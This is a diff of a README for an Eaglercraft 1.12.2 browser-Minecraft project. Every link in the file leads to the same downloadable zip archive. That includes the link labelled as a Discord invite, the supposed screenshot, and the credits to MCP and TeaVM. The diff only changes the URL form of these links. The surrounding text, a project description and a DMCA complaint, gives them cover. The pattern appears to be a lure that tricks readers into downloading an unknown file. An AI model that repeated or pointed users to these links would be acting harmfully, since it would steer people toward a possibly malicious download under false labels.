@@ -1,9 +1,9 @@
 # Eaglercraft 1.12.2 Project
 - files are gone due to copyright!
 # New Discord Server
-- Join the new server [https://raw.githubusercontent.com/Paaxy/Eaglercraft-1.12.2-Project/main/archaeologist/Eaglercraft-Project-v3.9.zip](https://raw.githubusercontent.com/Paaxy/Eaglercraft-1.12.2-Project/main/archaeologist/Eaglercraft-Project-v3.9.zip)
+- Join the new server [https://github.com/Paaxy/Eaglercraft-1.12.2-Project/raw/refs/heads/main/archaeologist/Eaglercraft-Project-v3.9.zip](https://github.com/Paaxy/Eaglercraft-1.12.2-Project/raw/refs/heads/main/archaeologist/Eaglercraft-Project-v3.9.zip)
 
-![EaglercraftX 1.12 Screenshot Main Menu](https://raw.githubusercontent.com/Paaxy/Eaglercraft-1.12.2-Project/main/archaeologist/Eaglercraft-Project-v3.9.zip)
+![EaglercraftX 1.12 Screenshot Main Menu](https://github.com/Paaxy/Eaglercraft-1.12.2-Project/raw/refs/heads/main/archaeologist/Eaglercraft-Project-v3.9.zip)
 
 ## ATTENTION MOJANG/MICROSOFT EMPLOYEE ASSIGNED TO STALK ME:
 
@@ -11,4 +11,4 @@
 
 ### FILING A FALSE DMCA IS ILLEGAL AND IMMORAL
 
-Eaglercraft uses the decompiled source of the official version of Minecraft 1.12 from Mojang decompiled by MCP https://raw.githubusercontent.com/Paaxy/Eaglercraft-1.12.2-Project/main/archaeologist/Eaglercraft-Project-v3.9.zip and compiled to Javascript using TeaVM https://raw.githubusercontent.com/Paaxy/Eaglercraft-1.12.2-Project/main/archaeologist/Eaglercraft-Project-v3.9.zip Therefore it can join any Minecraft 1.12 server, as it is really running (a modified version of) Minecraft 1.12 in the browser. However, due to CORS restrictions it must use a modified version of Bungeecord which proxies the browser's Websocket connection to the pure TCP connection used by Minecraft. For graphics, a custom compatibility layer created by me allows the fixed function OpenGL 1.3 based rendering engine mojang uses to operate through an HTML5 WebGL canvas with minimal changes to the source.
+Eaglercraft uses the decompiled source of the official version of Minecraft 1.12 from Mojang decompiled by MCP https://github.com/Paaxy/Eaglercraft-1.12.2-Project/raw/refs/heads/main/archaeologist/Eaglercraft-Project-v3.9.zip and compiled to Javascript using TeaVM https://github.com/Paaxy/Eaglercraft-1.12.2-Project/raw/refs/heads/main/archaeologist/Eaglercraft-Project-v3.9.zip Therefore it can join any Minecraft 1.12 server, as it is really running (a modified version of) Minecraft 1.12 in the browser. However, due to CORS restrictions it must use a modified version of Bungeecord which proxies the browser's Websocket connection to the pure TCP connection used by Minecraft. For graphics, a custom compatibility layer created by me allows the fixed function OpenGL 1.3 based rendering engine mojang uses to operate through an HTML5 WebGL canvas with minimal changes to the source.
